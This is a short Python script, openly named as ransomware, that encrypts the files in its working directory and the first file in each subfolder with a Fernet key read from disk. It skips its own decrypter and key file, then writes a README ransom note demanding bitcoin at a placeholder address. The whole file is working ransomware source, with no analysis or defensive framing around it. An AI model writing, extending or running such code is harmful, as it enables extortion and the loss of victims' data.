#Import the necessary libraries
import os
import logging
from cryptography.fernet import Fernet


class Ransomeware:
	def __init__(self, name):
		self.name = name
		self.files = os.listdir()
		self.folders = []
		self.key = open('key.key', 'r').read()
		self.fernet = Fernet(self.key)

	def Encrypt(self, file):
		with open(file, 'rb') as file_name:
			Content = file_name.read()
			EncryptedContent = self.fernet.encrypt(Content)

		with open(file, 'wb') as f:
			f.write(EncryptedContent)

	def FolderEncrypt(self):
		for folder in self.folders:
			for path, foldername, filename in os.walk(folder):
				with open(f'{path}\\{filename[0]}', "rb") as file:
					Content = file.read()
					EncryptedContent = self.fernet.encrypt(Content)

				with open(f'{path}\\{filename[0]}', "wb") as file:
					file.write(EncryptedContent)
					
	def FileEncrypt(self):
		for file in self.files:
			if os.path.isfile(file):
				if file == 'decrypter.py' or file == 'key.key':
					continue
				else:
					self.Encrypt(file)
			else:
				self.folders.append(file)

if __name__ == '__main__':
	FileEncrypter = Ransomeware('Ransomeware')
	FileEncrypter.FileEncrypt()
	FileEncrypter.FolderEncrypt()
	with open('README.md', 'w+') as file:
		file.write("Your files have been encrypted.\nIf you wish to get them back, send .001 bitcoin to <insert bitcoin address here>, and if it is valid they will send you the key.")